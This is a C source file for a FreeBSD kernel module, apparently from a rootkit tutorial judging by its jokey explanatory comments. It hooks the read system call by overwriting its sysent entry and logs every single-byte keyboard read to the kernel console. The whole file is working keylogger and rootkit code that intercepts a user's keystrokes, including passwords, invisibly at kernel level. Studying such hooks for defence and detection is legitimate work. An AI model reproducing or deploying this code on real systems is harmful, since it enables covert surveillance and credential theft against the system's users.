#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

// Now the hooking is done to log key strokes.

static int read_hook(struct thread * td, void * syscall_args) {
	// Ok so this is the hooking function for the read system call.
	// Even rootkit authors need to follow naming standards, what?

	// OK, so we need to access the parameters passed to this
// system call. Let us define a struct that can be used as a frame
// that can be placed on the register_t * syscall_args array. (refer
// sc_example.c for a more detailed note. (arcana, ha ha).

// Read system call reads nbytes into buf from fd. For reading from keyboard
// exactly one byte is read from the standard input. So the hooking
// function checks for that condition by testing whether the no of bytes
// read is anything other than 1. If it is, then we are not interested 
// because the input is not from a keyboard. Remember, read can be used
// for any type of read.

	int error = 0;
	char buf[1];
	int done;

	struct read_args  {
		int fd;
		void *buf;
		size_t nbyte;
	} *uap; // Pointer to user arguments.

	uap = (struct read_args *) syscall_args;

	error = read(td, syscall_args);
	
	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)) {
		return(error);
	}

	copyinstr(uap->buf, buf, 1, &done);
	
	printf("%c\n", buf[0]);

	return (error);
}

static int load(struct module * module, int cmd, void * arg) {

	int error = 0;

	switch(cmd) {

		case MOD_LOAD:
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			break;
		case MOD_UNLOAD:
			sysent[SYS_read].sy_call = (sy_call_t *)read;
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

static moduledata_t read_hook_mod = {

		"read_hook",

		load,
		NULL
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);


	




